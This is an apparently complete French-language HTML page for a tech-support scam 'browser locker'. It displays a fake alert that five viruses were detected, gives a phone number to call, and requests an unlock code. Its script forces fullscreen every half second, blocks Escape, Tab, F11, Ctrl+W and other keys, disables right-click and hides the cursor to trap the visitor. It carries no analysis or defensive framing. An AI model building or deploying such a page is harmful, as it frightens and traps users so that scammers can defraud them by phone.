<!DOCTYPE html><html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerte Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
            cursor: none;
        }
        html, body {
            width: 100vw;
            height: 100vh;
            background: black;
            color: white;
            font-family: 'Courier New', Courier, monospace;
            text-align: center;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            height: 100%;
            padding: 5%;
        }
        .message {
            font-size: 3vw;
            font-weight: bold;
        }
        .alert-number {
            font-size: 2.5vw;
            font-weight: bold;
            color: red;
        }
        #codeInput {
            margin-top: 20px;
            padding: 10px;
            font-size: 2vw;
            text-align: center;
            border: 2px solid white;
            width: 50%;
            background: black;
            color: white;
            outline: none;
        }
        #error-message {
            color: red;
            font-size: 1.5vw;
            margin-top: 10px;
            animation: shake 0.5s;
            animation-iteration-count: 1;
        }
        @keyframes shake {
            0% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            50% { transform: translateX(5px); }
            75% { transform: translateX(-5px); }
            100% { transform: translateX(0); }
        }
    </style>
</head>
<body oncontextmenu="return false" onkeydown="return blockKeys(event)">
    <div class="container">
        <p class="message"> 🚨 ATTENTION ! 🚨<br>5 VIRUS DÉTECTÉS SUR VOTRE APPAREIL !<br>🛑 Votre système est compromis ! 🛑</p>
        <p class="alert-number">+44 741 30 52 610</p>
        <p style="font-size: 2vw;">Entrez le code de déverrouillage :</p>
        <input type="password" id="codeInput" placeholder="Code secret">
        <p id="error-message"></p>
    </div>
    <script>
        function openFullscreen() {
            let elem = document.documentElement;
            if (elem.requestFullscreen) {
                elem.requestFullscreen();
            } else if (elem.mozRequestFullScreen) {
                elem.mozRequestFullScreen();
            } else if (elem.webkitRequestFullscreen) {
                elem.webkitRequestFullscreen();
            } else if (elem.msRequestFullscreen) {
                elem.msRequestFullscreen();
            }
        }function blockKeys(event) {
        let blockedKeys = ["Escape", "Tab", "F11", "F4", "Alt", "Control", "Meta", "Backspace"].filter(key => !["d", "a", "k", "r"].includes(key.toLowerCase()));
        if (blockedKeys.includes(event.key) || (event.ctrlKey && event.key === "w")) {
            event.preventDefault();
            return false;
        }
    }
    
    document.addEventListener("fullscreenchange", function() {
        if (!document.fullscreenElement) {
            openFullscreen();
        }
    });
    
    let inputField = document.getElementById("codeInput");
    let errorMessage = document.getElementById("error-message");
    
    inputField.addEventListener("keyup", function(event) {
        if (event.key === "Enter") {
            if (this.value === "1234" || this.value === "2012" || this.value.toLowerCase() === "dakar") {
                document.body.innerHTML = "<h1 style='color: white; text-align: center; margin-top: 20%; font-size: 3vw;'>Système restauré</h1>";
            } else {
                errorMessage.innerText = "Code incorrect !";
                errorMessage.classList.add("shake");
                setTimeout(() => errorMessage.classList.remove("shake"), 500);
                this.value = "";
            }
        }
    });
    
    window.onload = function() {
        openFullscreen();
        inputField.focus();
        repositionMouse();
    };
    
    function repositionMouse() {
        let x = 0;
        let y = 0;
        let event = new MouseEvent("mousemove", {
            bubbles: true,
            cancelable: true,
            clientX: x,
            clientY: y
        });
        document.dispatchEvent(event);
    }
    
    setInterval(openFullscreen, 500);
    setInterval(repositionMouse, 100);
</script>

</body>
</html>
